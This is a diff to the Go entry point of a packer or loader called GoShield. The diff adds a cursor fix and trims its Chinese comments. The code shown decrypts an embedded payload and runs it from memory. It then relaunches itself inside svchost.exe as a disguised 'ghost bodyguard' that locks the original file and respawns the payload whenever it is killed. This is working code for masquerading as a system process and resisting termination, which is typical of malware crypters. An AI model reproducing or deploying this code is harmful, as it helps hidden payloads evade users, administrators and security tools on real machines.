@@ -15,6 +15,28 @@ import (
 	"github.com/Limkon/GoShield/internal/protect"
 )
 
+var (
+	user32           = syscall.NewLazyDLL("user32.dll")
+	procPeekMessageW = user32.NewProc("PeekMessageW")
+)
+
+// MSG Windows 消息结构体
+type MSG struct {
+	Hwnd    syscall.Handle
+	Message uint32
+	WParam  uintptr
+	LParam  uintptr
+	Time    uint32
+	Pt      struct{ X, Y int32 }
+}
+
+// 🌟 核心提速修复：强行消除 Windows 的鼠标转圈等待状态
+func stopLoadingCursor() {
+	var msg MSG
+	// 强行调用一次 PeekMessage，Windows 收到反馈后会立刻取消“AppStarting”鼠标等待状态
+	procPeekMessageW.Call(uintptr(unsafe.Pointer(&msg)), 0, 0, 0, 1) // 1 = PM_REMOVE
+}
+
 // extractAndDecrypt 提取并解密 Payload 的复用核心函数
 func extractAndDecrypt(exePath string) ([]byte, error) {
 	file, err := os.Open(exePath)
@@ -57,17 +79,18 @@ func extractAndDecrypt(exePath string) ([]byte, error) {
 }
 
 func main() {
+	// 🌟 第一时间调用！让鼠标连 0.1 秒的转圈都不会有！
+	stopLoadingCursor()
+
 	exePath, err := os.Executable()
 	if err != nil {
 		os.Exit(1)
 	}
 
-	// 🌟 1. 终极分流：判断当前是否是潜伏在 svchost.exe 中的幽灵保镖
+	// 1. 终极分流：判断当前是否是潜伏在 svchost.exe 中的幽灵保镖
 	shadowPIDStr := os.Getenv("GOSHIELD_SHADOW_PID")
 	if shadowPIDStr != "" {
-		// ==========================================
-		// === 幽灵保镖逻辑 (此时运行在 svchost.exe 内存中) ===
-		// ==========================================
+		// === 幽灵保镖逻辑 ===
 		protect.ProtectProcess()
 		originalExe := os.Getenv("GOSHIELD_ORIGINAL_EXE")
 		protect.LockFile(originalExe)
@@ -81,60 +104,49 @@ func main() {
 		procCloseHandle := kernel32.NewProc("CloseHandle")
 
 		for {
-			// 尝试打开刚被父进程光速拉起的业务进程的句柄
 			hProcess, _, _ := procOpenProcess.Call(0x00100000|0x0400, 0, uintptr(targetPID))
 			if hProcess != 0 {
-				// 阻塞死守，保镖进入休眠状态
 				procWaitForSingleObject.Call(hProcess, 0xFFFFFFFF)
 				var exitCode uint32
 				procGetExitCodeProcess.Call(hProcess, uintptr(unsafe.Pointer(&exitCode)))
 				procCloseHandle.Call(hProcess)
 
-				// ExitCode 为 0 表示用户正常退出程序，保镖功成身退
 				if exitCode == 0 {
 					break
 				}
 			}
 
-			// 如果执行到这里，说明业务进程被非法强杀，或者没打开句柄 => 立刻原地复活！
 			decryptedPayload, err := extractAndDecrypt(originalExe)
 			if err != nil {
-				break // 原文件被破坏，终止复活
+				break
 			}
 			
 			newPID, err := loader.ExecuteAsync(originalExe, decryptedPayload)
 			if err != nil {
-				break // 底层拦截，终止复活
+				break
 			}
-			targetPID = int(newPID) // 更新监控目标，进入下一轮轮回
+			targetPID = int(newPID)
 		}
 		os.Exit(0)
 	}
 
-	// ==========================================
-	// === 原始父进程逻辑 (用户双击运行时的第一瞬间) ===
-	// ==========================================
-	
+	// === 原始父进程逻辑 ===
 	decryptedPayload, err := extractAndDecrypt(exePath)
 	if err != nil {
 		os.Exit(1)
 	}
 
-	// 🌟 核心提速点：父进程亲自、立刻、极速启动真实的业务程序！
-	// 不再做任何中转，解密完成的一瞬间直接在屏幕上弹出真实程序。
 	payloadPID, err := loader.ExecuteAsync(exePath, decryptedPayload)
 	if err != nil {
 		os.Exit(1)
 	}
 
-	// 并行：在业务程序已经在运行的同时，顺手把幽灵保镖扔到后台去
 	myExeBytes, err := os.ReadFile(exePath)
 	if err == nil {
-		os.Setenv("GOSHIELD_SHADOW_PID", strconv.Itoa(int(payloadPID))) // 把业务进程的 PID 交给保镖
+		os.Setenv("GOSHIELD_SHADOW_PID", strconv.Itoa(int(payloadPID)))
 		os.Setenv("GOSHIELD_ORIGINAL_EXE", exePath)
 		loader.ExecuteAsync("C:\\Windows\\System32\\svchost.exe", myExeBytes)
 	}
 
-	// 父进程献祭，深藏功与名
 	os.Exit(0)
 }
